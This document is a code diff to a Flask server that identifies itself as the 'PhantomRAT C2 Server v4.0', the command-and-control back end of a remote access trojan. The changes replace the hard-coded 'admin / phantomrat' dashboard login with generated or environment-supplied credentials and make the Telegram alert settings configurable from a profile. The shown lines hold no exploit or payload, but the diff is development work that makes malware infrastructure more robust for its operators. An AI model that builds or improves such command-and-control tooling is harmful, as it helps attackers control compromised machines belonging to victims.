@@ -10,6 +10,7 @@ import sqlite3
 import hashlib
 import base64
 import os
+import secrets
 import threading
 from flask import Flask, request, jsonify, render_template, redirect, url_for, session, g
 from cryptography.hazmat.primitives import hashes
@@ -32,6 +33,7 @@ with open('malleable_profile.json', 'r') as f:
 
 ENCRYPTION_KEY = b"phantomrat_32_char_encryption_key_here"
 KDF_SALT_FILE = os.path.join(os.path.dirname(__file__), 'phantomrat_kdf_salt.bin')
+ADMIN_CREDENTIAL_FILE = os.path.join(os.path.dirname(__file__), 'phantom_admin.json')
 KDF_ITERATIONS = 200_000
 
 
@@ -114,8 +116,50 @@ def load_encryption_key():
 FERNET_KEY = derive_fernet_key(load_encryption_key())
 CIPHER = Fernet(FERNET_KEY)
 
-BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', '')
-CHAT_ID = os.environ.get('TELEGRAM_CHAT_ID', '')
+def load_telegram_settings():
+    """Load Telegram notification settings from env or profile."""
+    env_token = os.environ.get('TELEGRAM_BOT_TOKEN')
+    env_chat = os.environ.get('TELEGRAM_CHAT_ID')
+    if env_token and env_chat:
+        return env_token, env_chat
+
+    telegram_cfg = PROFILE.get('notifications', {}).get('telegram', {})
+    return telegram_cfg.get('bot_token', ''), telegram_cfg.get('chat_id', '')
+
+
+def load_admin_credentials():
+    """Load bootstrap admin credentials from env, file, or generate securely."""
+    username = os.environ.get('PHANTOM_ADMIN_USERNAME', 'admin')
+    password = os.environ.get('PHANTOM_ADMIN_PASSWORD')
+
+    if password:
+        return username, password
+
+    # Check persisted credential file
+    try:
+        if os.path.exists(ADMIN_CREDENTIAL_FILE):
+            with open(ADMIN_CREDENTIAL_FILE, 'r') as cred_file:
+                stored = json.load(cred_file)
+                stored_user = stored.get('username', username)
+                stored_pass = stored.get('password')
+                if stored_pass:
+                    return stored_user, stored_pass
+    except Exception:
+        pass
+
+    # Generate secure password and persist for reuse
+    generated_password = secrets.token_urlsafe(20)
+    try:
+        with open(ADMIN_CREDENTIAL_FILE, 'w') as cred_file:
+            json.dump({'username': username, 'password': generated_password}, cred_file)
+        os.chmod(ADMIN_CREDENTIAL_FILE, 0o600)
+        print(f"[+] Admin credentials generated and stored at {ADMIN_CREDENTIAL_FILE}")
+    except Exception:
+        pass
+    return username, generated_password
+
+
+BOT_TOKEN, CHAT_ID = load_telegram_settings()
 
 # Color scheme for PhantomRat
 RAT_COLORS = ['#1a1a2e', '#16213e', '#0f3460', '#e94560']
@@ -155,6 +199,8 @@ def decrypt_data(encrypted_data):
 def send_telegram(message):
     """Send notification to Telegram"""
     try:
+        if not BOT_TOKEN or not CHAT_ID:
+            return
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         data = {
             "chat_id": CHAT_ID,
@@ -411,12 +457,17 @@ def init_db():
             )
         ''')
         
-        # Add default admin user if not exists
-        existing = db.execute('SELECT COUNT(*) as count FROM users WHERE username = ?', ('admin',)).fetchone()
+        # Add bootstrap admin user if not exists
+        admin_username, admin_password = load_admin_credentials()
+        existing = db.execute(
+            'SELECT COUNT(*) as count FROM users WHERE username = ?', (admin_username,)
+        ).fetchone()
         if existing['count'] == 0:
-            password_hash = generate_password_hash('phantomrat')
-            db.execute('INSERT INTO users (username, password_hash) VALUES (?, ?)',
-                      ('admin', password_hash))
+            password_hash = generate_password_hash(admin_password)
+            db.execute(
+                'INSERT INTO users (username, password_hash) VALUES (?, ?)',
+                (admin_username, password_hash),
+            )
         
         db.commit()
         print("[+] Database initialized successfully")
@@ -1243,6 +1294,5 @@ if __name__ == '__main__':
     print(f"[+] PhantomRAT C2 Server v4.0")
     print(f"[+] Starting on {args.host}:{args.port}")
     print(f"[+] Dashboard: http://{args.host if args.host != '0.0.0.0' else '127.0.0.1'}:{args.port}")
-    print(f"[+] Default login: admin / phantomrat")
     
     app.run(host=args.host, port=args.port, debug=args.debug)
